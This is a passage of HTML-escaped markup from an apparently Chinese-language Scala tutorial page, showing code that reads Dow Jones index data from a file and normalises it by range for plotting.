&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613ca092497848-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613ca092497848-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613ca092497848-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613ca092497848-23&quot;&gt;23&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613ca092497848-1&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;def &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getDJIFromFile&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Double&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613ca092497848-2&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scala&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Source&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;fromFile&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613ca092497848-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Get all the records (minus the header)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613ca092497848-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//获取所有记录（减去标头）&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613ca092497848-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;source&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613ca092497848-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getLines&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613ca092497848-7&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;drop&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613ca092497848-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getDJIRecordFromString&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613ca092497848-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;toArray&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613ca092497848-10&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613ca092497848-11&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613ca092497848-12&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613ca092497848-13&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//turn the tuples into two separate arrays for easier use later on&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613ca092497848-14&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//将这些元组分隔为两个数组以方便之后使用&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613ca092497848-15&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sortedData&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;sortBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613ca092497848-16&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dates&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sortedData&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613ca092497848-17&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;maxDouble&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sortedData&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;maxBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;_2&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613ca092497848-18&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;minDouble&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sortedData&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;minBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;_2&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613ca092497848-19&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rangeValue&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;maxDouble&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;minDouble&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613ca092497848-20&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;doubles&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sortedData&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;rangeValue&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613ca092497848-21&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613ca092497848-22&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dates&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;doubles&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613ca092497848-23&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0038 seconds] --&gt;
&lt;p&gt;用下列代码替换 def top 方法中 plotData 的定义：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d0613cd945835709&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Scala&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
val maxDataValue = points.maxBy(x =&amp;gt; x(0))
val minDataValue = points.minBy(x =&amp;gt; x(0))
val rangeValue = maxDataValue(0) - minDataValue(0)
val plotData = points
    .zipWithIndex
    .map(x =&amp;gt; Array(x._2.toDouble, -x._1(0) / rangeValue))&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613cd945835709-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613cd945835709-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613cd945835709-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613cd945835709-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613cd945835709-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613cd945835709-6&quot;&gt;6&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613cd945835709-1&quot;&gt;
&lt;span class=&quot;crayon-r&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;maxDataValue&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;points&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;maxBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613cd945835709-2&quot;&gt;
&lt;span class=&quot;crayon-r&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;minDataValue&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;points&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;minBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613cd945835709-3&quot;&gt;
&lt;span class=&quot;crayon-r&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rangeValue&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;maxDataValue&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;minDataValue&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613cd945835709-4&quot;&gt;
&lt;span class=&quot;crayon-r&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;plotData&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;points&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613cd945835709-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;zipWithIndex&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613cd945835709-6&quot;&gt;
